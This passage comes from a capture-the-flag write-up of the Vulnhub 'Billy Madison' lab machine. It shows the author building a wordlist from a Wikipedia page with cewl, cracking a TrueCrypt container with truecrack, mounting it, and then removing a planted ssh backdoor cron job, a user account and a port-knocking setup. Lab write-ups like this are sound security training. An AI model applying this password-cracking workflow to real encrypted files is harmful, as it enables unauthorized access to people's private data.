drwxr-xr-x   2 root root  4096 Jul 19  2016 mnt
drwxr-xr-x  11 root root  4096 Aug 22  2016 opt
drwx------   2 root root  4096 Aug 29  2016 PRIVATE
dr-xr-xr-x 228 root root     0 Mar 14 15:06 proc
drwx------   8 root root  4096 Mar 14 15:06 root
drwxr-xr-x  25 root root  1060 Mar 14 15:17 run
drwxr-xr-x   2 root root 12288 Mar 14 15:11 sbin
drwxr-xr-x   2 root root  4096 Jun 29  2016 snap
drwxr-xr-x   2 root root  4096 Jul 19  2016 srv
dr-xr-xr-x  13 root root     0 Mar 14 15:38 sys
drwxrwxrwt   9 root root  4096 Mar 14 15:40 tmp
drwxr-xr-x  10 root root  4096 Aug  5  2016 usr
drwxr-xr-x  14 root root  4096 Aug 11  2016 var
lrwxrwxrwx   1 root root    29 Mar 14 15:13 vmlinuz -> boot/vmlinuz-4.4.0-66-generic
lrwxrwxrwx   1 root root    29 Aug 30  2016 vmlinuz.old -> boot/vmlinuz-4.4.0-36-generic
root@BM:/# cd PRIVATE
root@BM:/PRIVATE# ls -la
total 1036
drwx------  2 root  root     4096 Aug 29  2016 .
drwxr-xr-x 25 root  root     4096 Mar 14 15:13 ..
-rw-rw-r--  1 billy billy 1048576 Aug 21  2016 BowelMovement
-rw-r--r--  1 root  root      221 Aug 29  2016 hint.txt
root@BM:/PRIVATE# cat hint.txt
Heh, I called the file BowelMovement because it has the same initials as
Billy Madison.  That truely cracks me up!  LOLOLOL!

I always forget the password, but it's here:

https://en.wikipedia.org/wiki/Billy_Madison

-EG

{% endhighlight %}

<h2>Cracking the flag</h2>

<p>Hmm, it seems that we have to create another <b>wordlist</b> from Wikipedia entry. </p>

{% highlight bash %}
root@kali:~# cewl --depth 0 -w wiki.list https://en.wikipedia.org/wiki/Billy_Madison
CeWL 5.2 (Some Chaos) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
{% endhighlight %}

<p>We can now try to crack it using <b>truecrack</b> tool. </p>

{% highlight bash %}
root@kali:~# truecrack -w wiki.list -t BowelMovement
TrueCrack v3.0
Website: http://code.google.com/p/truecrack
Contact us: infotruecrack@gmail.com
Found password:        "execrable"
Password length:    "10"
Total computations:    "603"
{% endhighlight %}

<p>Another victory! We can now mount it using <b>veracrypt</b>, and see if there are final flags. </p>

{% highlight bash %}
root@kali:~# veracrypt -tc BowelMovement billy-vera
Enter password for /root/BowelMovement:
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:
root@kali:~# cd billy-vera
root@kali:~/billy-vera# find . -ls
        1     16 drwx------   3 root     root        16384 Dec 31  1969 .
       65      1 -rwx------   1 root     root         1000 Aug 21 10:22 ./secret.zip
       66      1 drwx------   2 root     root          512 Aug 21 10:39 ./$RECYCLE.BIN
       68      1 -rwx------   1 root     root          129 Aug 21 10:39 ./$RECYCLE.BIN/desktop.ini
root@kali:~/billy-vera# unzip secret.zip
Archive:  secret.zip
inflating: Billy_Madison_12th_Grade_Final_Project.doc  
inflating: THE-END.txt             
root@kali:~/billy-vera# cat THE-END.txt
Congratulations!

If you're reading this, you win!

I hope you had fun.  I had an absolute blast putting this together.

I'd love to have your feedback on the box - or at least know you pwned it!

Please feel free to shoot me a tweet or email (7ms@7ms.us) and let me know with
the subject line: "Stop looking at me swan!"

Thanks much,

Brian Johnson
7 Minute Security
www.7ms.us
{% endhighlight %}

<p>We did it, what a great journey! Lastly, let's view Billy's assignment. </p>

{% highlight bash %}
Billy Madison
Final Project
Knibb High



                                       The Industrial Revolution

The Industrial Revolution to me is just like a story I know called "The Puppy Who Lost His Way."
The world was changing, and the puppy was getting... bigger.

So, you see, the puppy was like industry. In that, they were both lost in the woods.
And nobody, especially the little boy - "society" - knew where to find 'em.
Except that the puppy was a dog.
But the industry, my friends, that was a revolution.

KNIBB HIGH FOOTBALL RULES!!!!!

https://www.youtube.com/watch?v=BlPw6MKvvIc

-BM

{% endhighlight %}

<h2>Cleanup</h2>

<p>Our task was to also undo Eric's changes. Firstly let's disable <b>ssh</b>. </p>

{% highlight bash %}
root@BM:~# update-rc.d ssh disable
insserv: warning: current start runlevel(s) (empty) of script `ssh' overrides LSB defaults (2 3 4 5).
insserv: warning: current stop runlevel(s) (2 3 4 5) of script `ssh' overrides LSB defaults (empty).
{% endhighlight %}

<p>We can also terminate the service with <b>service ssh stop</b>.</p>

<p>We will also have to disable the backdoor, which is ssh service showing up after receiving email with certain phrase. We can do this by removing an entry from <b>crontab</b>. </p>

{% highlight text %}
*/1 * * * * /root/ssh/canyoussh.sh
{% endhighlight %}

<p>We also have to delete eric's account. </p>

{% highlight bash %}
root@BM:~# userdel eric
{% endhighlight %}

<p>Now let's disable port knocking sequence, which can be done by editing <b>/etc/knockd.conf</b> file, then delete all files from web root directory and lastly change passwords to all of the accounts. </p>

<p>In addition, I've found that interesting binary at <b>/usr/local/share/sgml/donpcgd</b>, which possibly is another way to gain root. We will have to delete it. </p>

<h1>Last words</h1>

<p>It was great fun to participate in this Vulnhub machine. Much thanks to <a href="https://twitter.com/7MinSec"><b>Brian Johnson</b></a> for creating this challenge and to <b>Yodak#2187</b> for bringing up some ideas. I'm looking forward to try more machines and root them all! </p>

<p>Stay safe!</p>
